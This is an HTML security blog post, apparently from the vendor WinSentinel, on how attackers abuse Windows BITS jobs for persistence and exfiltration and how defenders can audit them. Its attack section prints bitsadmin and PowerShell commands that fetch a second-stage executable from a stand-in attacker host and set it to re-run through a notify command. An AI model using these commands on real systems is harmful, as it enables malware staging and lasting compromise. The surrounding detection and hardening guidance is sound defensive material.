@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BITS Jobs: The Windows Transfer Service Attackers Use to Persist and Exfiltrate — WinSentinel Blog</title>
+  <meta name="description" content="Background Intelligent Transfer Service jobs survive reboots, run as SYSTEM, and blend into normal Windows update traffic. Here's how attackers weaponize BITS and how to audit it." />
+  <meta name="theme-color" content="#0b0f17" />
+  <meta name="author" content="Saurav Bhattacharya" />
+  <meta property="og:title" content="BITS Jobs: The Windows Transfer Service Attackers Use to Persist and Exfiltrate" />
+  <meta property="og:description" content="Background Intelligent Transfer Service jobs survive reboots, run as SYSTEM, and blend into normal Windows update traffic. Here's how attackers weaponize BITS and how to audit it." />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2026-09-04" />
+  <meta property="og:url" content="https://winsentinel.ai/blog/bits-job-persistence-exfiltration" />
+  <meta property="og:image" content="https://winsentinel.ai/og/blog-bits-job-persistence-exfiltration.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://winsentinel.ai/og/blog-bits-job-persistence-exfiltration.png" />
+  <meta name="twitter:title" content="BITS Jobs: The Windows Transfer Service Attackers Use to Persist and Exfiltrate" />
+  <meta name="twitter:description" content="Background Intelligent Transfer Service jobs survive reboots, run as SYSTEM, and blend into normal Windows update traffic. Here's how attackers weaponize BITS and how to audit it." />
+  <link rel="canonical" href="https://winsentinel.ai/blog/bits-job-persistence-exfiltration" />
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cpath fill='%2338bdf8' d='M32 4 8 14v18c0 14 10 24 24 28 14-4 24-14 24-28V14L32 4Z'/%3E%3Cpath fill='%230b0f17' d='m28 38-7-7 3-3 4 4 11-11 3 3-14 14Z'/%3E%3C/svg%3E" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            mono: ['ui-monospace','SFMono-Regular','Menlo','Monaco','Consolas','monospace'],
+            sans: ['Inter','ui-sans-serif','system-ui','-apple-system','Segoe UI','Roboto','sans-serif'],
+          },
+          colors: {
+            ink: { 950: '#070a11', 900: '#0b0f17', 800: '#11161f', 700: '#1a2030' },
+          },
+        },
+      },
+    };
+  </script>
+  <style>
+    html { scroll-behavior: smooth; }
+    body { background: radial-gradient(1200px 600px at 50% -200px, #0e1a2d 0%, #070a11 60%, #070a11 100%); }
+    .prose h2 { color: #fff; font-size: 1.5rem; font-weight: 700; margin-top: 2rem; margin-bottom: 0.75rem; }
+    .prose h3 { color: #e2e8f0; font-size: 1.125rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
+    .prose p { color: #cbd5e1; line-height: 1.75; margin-bottom: 1rem; }
+    .prose code { color: #7dd3fc; background: rgba(56,189,248,.08); padding: 2px 6px; border-radius: 4px; font-size: 0.875em; }
+    .prose pre { background: #11161f; border: 1px solid rgba(255,255,255,.08); border-radius: 8px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
+    .prose pre code { background: none; padding: 0; color: #e2e8f0; }
+    .prose ul { list-style: disc; padding-left: 1.5rem; color: #cbd5e1; margin-bottom: 1rem; }
+    .prose li { margin-bottom: 0.25rem; }
+    .prose a { color: #38bdf8; text-decoration: underline; text-underline-offset: 2px; }
+    .prose a:hover { color: #7dd3fc; }
+    .prose blockquote { border-left: 3px solid #38bdf8; padding-left: 1rem; color: #94a3b8; font-style: italic; margin: 1rem 0; }
+  </style>
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "@id": "https://winsentinel.ai/blog/bits-job-persistence-exfiltration",
+  "headline": "BITS Jobs: The Windows Transfer Service Attackers Use to Persist and Exfiltrate",
+  "datePublished": "2026-09-04",
+  "dateModified": "2026-09-04",
+  "url": "https://winsentinel.ai/blog/bits-job-persistence-exfiltration",
+  "mainEntityOfPage": "https://winsentinel.ai/blog/bits-job-persistence-exfiltration",
+  "description": "Background Intelligent Transfer Service jobs survive reboots, run as SYSTEM, and blend into normal Windows update traffic. Here's how attackers weaponize BITS and how to audit it.",
+  "author": {
+    "@type": "Person",
+    "name": "Saurav Bhattacharya"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "WinSentinel",
+    "url": "https://winsentinel.ai",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://winsentinel.ai/og/default.svg"
+    }
+  },
+  "image": "https://winsentinel.ai/og/blog-bits-job-persistence-exfiltration.png",
+  "isPartOf": {
+    "@type": "Blog",
+    "@id": "https://winsentinel.ai/blog",
+    "name": "WinSentinel Blog"
+  }
+}
+  </script>
+<!-- Cloudflare Web Analytics (cookieless). Token is set out-of-band; loader no-ops until configured. -->
+<script>window.__WS_CF_BEACON_TOKEN__ = "__CF_BEACON_TOKEN__";</script>
+<script defer src="/js/cf-analytics.js"></script>
+</head>
+<body class="font-sans text-slate-200 antialiased">
+
+<div id="site-header"></div>
+
+<article class="max-w-3xl mx-auto px-6 pt-14 pb-20">
+  <a href="/blog" class="text-sm text-sky-400 hover:text-sky-300">← All posts</a>
+  <time class="mt-8 block text-xs text-slate-500 uppercase tracking-wider">September 4, 2026</time>
+  <h1 class="mt-2 text-3xl md:text-4xl font-bold text-white leading-tight">BITS Jobs: The Windows Transfer Service Attackers Use to Persist and Exfiltrate</h1>
+  <p class="mt-4 text-lg text-slate-300">Background Intelligent Transfer Service jobs survive reboots, run as SYSTEM, and blend into normal Windows update traffic. Here's how attackers weaponize BITS and how to audit it.</p>
+
+  <div class="prose mt-8">
+    <p>The Background Intelligent Transfer Service (BITS) is the plumbing that lets Windows Update, Microsoft Store, and a hundred enterprise agents pull files in the background without saturating your link. It is throttle-aware, resumes after a reboot, and retries for days. Those are exactly the properties an attacker wants from a persistence and exfiltration channel — which is why BITS abuse (MITRE ATT&amp;CK <strong>T1197</strong>) keeps showing up in real intrusions from commodity loaders all the way to nation-state toolkits.</p>
+
+    <h2>Why BITS is such a clean tradecraft choice</h2>
+    <p>Most defenders instrument process creation and PowerShell. BITS sidesteps both. A transfer job is not a running process — it is a state entry owned by the <code>svchost.exe</code>-hosted service. The actual network fetch happens under a service account, often SYSTEM, with a User-Agent of <code>Microsoft BITS/7.8</code> that looks identical to legitimate update traffic. When the job completes, BITS can fire a <em>notify command</em> to run an arbitrary program. That gives an attacker three things in one primitive:</p>
+    <ul>
+      <li><strong>Ingress tool transfer</strong> — download a second-stage payload without <code>curl</code>, <code>certutil</code>, or a browser touching disk in an obvious way.</li>
+      <li><strong>Persistence</strong> — a job with a long retry window and a <code>SetNotifyCmdLine</code> re-executes the payload every time the transfer "completes," surviving reboots for up to 90 days by default.</li>
+      <li><strong>Exfiltration</strong> — BITS uploads (<code>bitsadmin /transfer /upload</code> or the <code>Start-BitsTransfer -TransferType Upload</code>) push data out through the same trusted channel.</li>
+    </ul>
+
+    <h2>What the attack looks like</h2>
+    <p>The classic living-off-the-land version uses the built-in <code>bitsadmin.exe</code>, still present for backward compatibility:</p>
+    <pre><code>bitsadmin /create backdoor
+bitsadmin /addfile backdoor http://attacker.example/stage2.exe %APPDATA%\svc.exe
+bitsadmin /SetNotifyCmdLine backdoor %APPDATA%\svc.exe NULL
+bitsadmin /SetMinRetryDelay backdoor 60
+bitsadmin /resume backdoor</code></pre>
+    <p>The modern, quieter version uses the PowerShell BITS cmdlets, which never shell out to a suspicious binary name:</p>
+    <pre><code>Import-Module BitsTransfer
+Start-BitsTransfer -Source http://attacker.example/stage2.exe `
+  -Destination $env:APPDATA\svc.exe -TransferType Download -Asynchronous</code></pre>
+    <p>Because the job persists in the BITS queue rather than in a Run key or scheduled task, tools that only walk the usual autostart locations miss it entirely. This is the blind spot BITS abuse depends on.</p>
+
+    <h2>Auditing BITS on a single machine</h2>
+    <p>Every Windows box already carries the evidence — you just have to look where nothing else does. Start with the live job queue and the operational log:</p>
+    <ul>
+      <li><strong>Enumerate all jobs, all users:</strong> <code>bitsadmin /list /allusers /verbose</code> and <code>Get-BitsTransfer -AllUsers</code>. Any job with a <code>NotifyCmdLine</code>, a destination in <code>%TEMP%</code>/<code>%APPDATA%</code>/<code>Public</code>, or a remote HTTP source that is not a known Microsoft/vendor endpoint deserves a hard look.</li>
+      <li><strong>Read the operational log:</strong> <code>Microsoft-Windows-Bits-Client/Operational</code>. Event <strong>3</strong> records job creation with the owner SID; events <strong>59/60</strong> record the URL and completion. Correlate the owner and the URL — a SYSTEM-owned job pulling from a raw IP is a red flag.</li>
+      <li><strong>Check retry windows:</strong> a job with an abnormally long <code>JobPriority</code> lifetime or a tiny <code>MinRetryDelay</code> is engineered for persistence, not for a real download.</li>
+    </ul>
+    <blockquote>Rule of thumb: legitimate BITS jobs are transient and owned by service installers or Windows Update. A job that has lived across multiple reboots, is owned by an interactive user, and carries a notify command is persistence until proven otherwise.</blockquote>
+    <p>WinSentinel runs this exact enumeration as part of its persistence and living-off-the-land audit surface — every one of the tool's 33 modules is available free on a single machine with no cap. It flags BITS jobs with notify commands, non-Microsoft sources, and long retry windows, then explains why each one is suspicious and how to remove it (<code>bitsadmin /cancel &lt;job&gt;</code> or <code>Remove-BitsTransfer</code>).</p>
+
+    <h2>Hardening and detection that actually holds</h2>
+    <ol>
+      <li><strong>Turn on the operational log and forward it.</strong> The Bits-Client operational channel is on by default but rarely collected. Ship events 3/59/60 to your log pipeline so a notify-command job creation is queryable.</li>
+      <li><strong>Alert on notify commands.</strong> A BITS job that sets <code>SetNotifyCmdLine</code> is rare in benign use. Treat its creation as a high-signal detection.</li>
+      <li><strong>Constrain egress.</strong> BITS honors proxy and firewall policy. If only your update/CDN endpoints are reachable, arbitrary-URL exfiltration jobs fail at the network layer.</li>
+      <li><strong>Baseline and diff.</strong> Snapshot the expected BITS job set for your standard image and alert on anything outside it.</li>
+    </ol>
+
+    <h2>Where fleets change the math</h2>
+    <p>One machine you can inspect by hand. Fifty or five hundred, and BITS abuse becomes a needle-in-haystack problem — a single compromised endpoint hiding a persistence job among thousands of legitimate update transfers. This is where WinSentinel Pro's fleet orchestration earns its place: the central node rolls BITS findings up across every agent, so a suspicious notify-command job on <em>one</em> host surfaces in a single view instead of requiring you to log into each box. Drift alerts fire when a new BITS persistence entry appears on a machine that had none at last scan, turning a manual hunt into a push notification.</p>
+
+    <p>BITS is a great example of why agent-based auditing beats a point-in-time scan: the abuse lives in service state, not in a process you can catch with a snapshot. Enumerate the queue, watch the operational log, and treat any job with a notify command and a non-Microsoft source as hostile until you can prove otherwise.</p>
+  </div>
+
+  <nav class="mt-16 pt-8 border-t border-white/10 flex items-center justify-between gap-6 text-sm text-slate-400">
+    <span></span>
+    <a href="/blog/netsh-helper-dll-persistence-the-networking-extension-point-" class="hover:text-white text-right">Netsh Helper DLL Persistence: The Networking Extension Point Attackers Load at Boot →</a>
+  </nav>
+</article>
+
+<div id="site-footer"></div>
+<script src="/components/nav.js"></script>
+</body>
+</html>
